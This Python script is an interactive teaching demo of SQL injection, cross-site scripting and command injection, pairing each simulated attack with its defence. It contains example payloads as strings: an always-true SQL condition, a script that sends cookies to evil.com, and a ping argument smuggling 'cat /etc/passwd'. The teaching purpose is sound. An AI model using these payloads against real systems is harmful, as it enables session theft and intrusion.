#!/usr/bin/env python3
"""
Input Sanitization Demo
Demonstrates common injection vulnerabilities and how to prevent them.
"""

import html
import re
import urllib.parse


class MockDatabase:
    """Simulates a simple database for SQL injection demo."""

    def __init__(self):
        self.users = {
            "1": {"username": "admin", "password": "SuperSecret123!", "role": "admin"},
            "2": {"username": "john_doe", "password": "john2024", "role": "user"},
            "3": {"username": "jane_smith", "password": "jane2024", "role": "user"},
        }

    def query_vulnerable(self, user_id):
        """Vulnerable query that directly uses user input."""
        # Simulating: SELECT * FROM users WHERE id = '{user_id}'
        # This is intentionally vulnerable for demonstration
        if user_id in self.users:
            return self.users[user_id]
        # Simulating SQL injection bypass
        if "' OR '1'='1" in user_id or "OR 1=1" in user_id:
            return {"username": "ALL_USERS_EXPOSED", "password": "INJECTION_SUCCESS", "role": "admin"}
        return None

    def query_secure(self, user_id):
        """Secure query with input validation."""
        if not re.match(r'^\d+$', user_id):
            return None
        return self.users.get(user_id)


def demo_sql_injection():
    """Demonstrate SQL injection and prevention."""
    print("\n" + "=" * 60)
    print("SQL INJECTION DEMO")
    print("=" * 60)
    print("SQL injection occurs when user input is inserted directly into")
    print("a database query without proper sanitization.\n")

    db = MockDatabase()

    # Normal query
    print("--- Normal Query ---")
    user_id = "2"
    print(f"User input: '{user_id}'")
    print(f"Query: SELECT * FROM users WHERE id = '{user_id}'")
    result = db.query_vulnerable(user_id)
    print(f"Result: {result}")

    # Malicious input
    print("\n--- Malicious Input (Injection Attack) ---")
    malicious_input = "' OR '1'='1"
    print(f"User input: {malicious_input}")
    print(f"Query becomes: SELECT * FROM users WHERE id = '' OR '1'='1'")
    print("This condition is ALWAYS true, returning ALL records!")
    result = db.query_vulnerable(malicious_input)
    print(f"Result: {result}")

    # Secure version
    print("\n--- Secure Query (Parameterized/Validated) ---")
    print("The secure version only accepts numeric IDs.")
    result_safe = db.query_secure(malicious_input)
    print(f"Malicious input result: {result_safe}")
    result_safe = db.query_secure("2")
    print(f"Valid input result: {result_safe}")

    print("\nPREVENTION:")
    print("  1. Use parameterized queries (prepared statements)")
    print("  2. Validate input type (e.g., only integers for IDs)")
    print("  3. Apply whitelist validation")
    print("  4. Use ORM frameworks that handle escaping automatically")


def demo_xss():
    """Demonstrate Cross-Site Scripting and prevention."""
    print("\n" + "=" * 60)
    print("CROSS-SITE SCRIPTING (XSS) DEMO")
    print("=" * 60)
    print("XSS occurs when user input is displayed on a page without")
    print("proper output encoding, allowing script injection.\n")

    malicious_input = '<script>alert("XSS!");document.location="https://evil.com/steal?cookie="+document.cookie</script>'
    innocent_input = "Hello, I love this website!"

    print("--- Vulnerable Output (No Encoding) ---")
    print(f"User input: {malicious_input}")
    print("HTML Output:")
    print(f"  <div class='comment'>{malicious_input}</div>")
    print("Result: Script executes in the browser! Cookies stolen.")

    print("\n--- Secure Output (HTML Encoding) ---")
    encoded = html.escape(malicious_input)
    print(f"Encoded output: {encoded[:60]}...")
    print("HTML Output:")
    print(f"  <div class='comment'>{encoded[:80]}...</div>")
    print("Result: Browser displays text safely, script does not execute.")

    print("\n--- Innocent Input (Works Fine Either Way) ---")
    print(f"User input: {innocent_input}")
    print(f"Encoded: {html.escape(innocent_input)}")
    print("Innocent input looks the same before and after encoding.")

    print("\nPREVENTION:")
    print("  1. Encode ALL output based on context (HTML, JS, CSS, URL)")
    print("  2. Use modern frameworks with auto-escaping (React, Vue, etc.)")
    print("  3. Implement Content Security Policy (CSP)")
    print("  4. Validate input on the server side")


def demo_command_injection():
    """Demonstrate command injection and prevention."""
    print("\n" + "=" * 60)
    print("COMMAND INJECTION DEMO")
    print("=" * 60)
    print("Command injection occurs when user input is passed to")
    print("system commands without proper sanitization.\n")

    def ping_vulnerable(host):
        """Vulnerable to command injection."""
        # NEVER do this in real code!
        import subprocess
        cmd = f"ping -c 1 {host}"
        print(f"Executing: {cmd}")
        # Simulated output
        if ";" in host or "|" in host or "&" in host:
            print("SIMULATED: Additional commands executed!")
            print("  Output: root:x:0:0:root:/root:/bin/bash")
            print("  Output: password hashes exposed")
            return "INJECTION SUCCESSFUL"
        return f"PING {host}: 1 packets transmitted, 1 received"

    def ping_secure(host):
        """Secure version with validation."""
        # Allow only valid hostnames and IPs
        if not re.match(r'^[a-zA-Z0-9\.\-:]+$', host):
            return "Error: Invalid hostname"
        return f"PING {host}: 1 packets transmitted, 1 received"

    print("--- Normal Usage ---")
    print(ping_vulnerable("google.com"))

    print("\n--- Malicious Input ---")
    malicious = "google.com; cat /etc/passwd"
    print(f"Input: {malicious}")
    ping_vulnerable(malicious)

    print("\n--- Secure Version ---")
    print(f"Input: {malicious}")
    print(ping_secure(malicious))

    print("\nPREVENTION:")
    print("  1. NEVER pass user input to shell commands")
    print("  2. Use library functions instead of shell commands")
    print("  3. If unavoidable, use strict whitelist validation")
    print("  4. Prefer parameterized APIs (subprocess with list args)")


def demo_input_validation():
    """Show comprehensive input validation techniques."""
    print("\n" + "=" * 60)
    print("INPUT VALIDATION TECHNIQUES")
    print("=" * 60)

    test_inputs = [
        ("john@example.com", "email"),
        ("not-an-email", "email"),
        ("192.168.1.1", "ip"),
        ("999.999.999.999", "ip"),
        ("script><alert(1)", "username"),
        ("john_doe_123", "username"),
    ]

    patterns = {
        "email": r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
        "ip": r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$',
        "username": r'^[a-zA-Z0-9_]{3,20}$',
    }

    for value, expected_type in test_inputs:
        pattern = patterns.get(expected_type)
        is_valid = bool(re.match(pattern, value)) if pattern else False
        status = "VALID" if is_valid else "REJECTED"
        print(f"{status:<10} [{expected_type:<10}] '{value}'")

    print("\nBEST PRACTICES:")
    print("  1. Whitelist validation (accept only known-good patterns)")
    print("  2. Type validation (ensure data is the expected type)")
    print("  3. Length validation (prevent buffer overflows)")
    print("  4. Range validation (for numeric values)")
    print("  5. Validate on SERVER SIDE (client-side is for UX only)")


def main():
    print("=" * 60)
    print("INPUT SANITIZATION DEMO")
    print("=" * 60)
    print("Learn how injection attacks work and how to prevent them.\n")

    while True:
        print("\nMenu:")
        print("1. SQL Injection Demo")
        print("2. XSS (Cross-Site Scripting) Demo")
        print("3. Command Injection Demo")
        print("4. Input Validation Techniques")
        print("5. Run All Demos")
        print("6. Exit")

        choice = input("\nSelect option (1-6): ").strip()

        if choice == "1":
            demo_sql_injection()
        elif choice == "2":
            demo_xss()
        elif choice == "3":
            demo_command_injection()
        elif choice == "4":
            demo_input_validation()
        elif choice == "5":
            demo_sql_injection()
            demo_xss()
            demo_command_injection()
            demo_input_validation()
        elif choice == "6":
            print("Always sanitize your inputs!")
            break
        else:
            print("Invalid choice.")


if __name__ == "__main__":
    main()
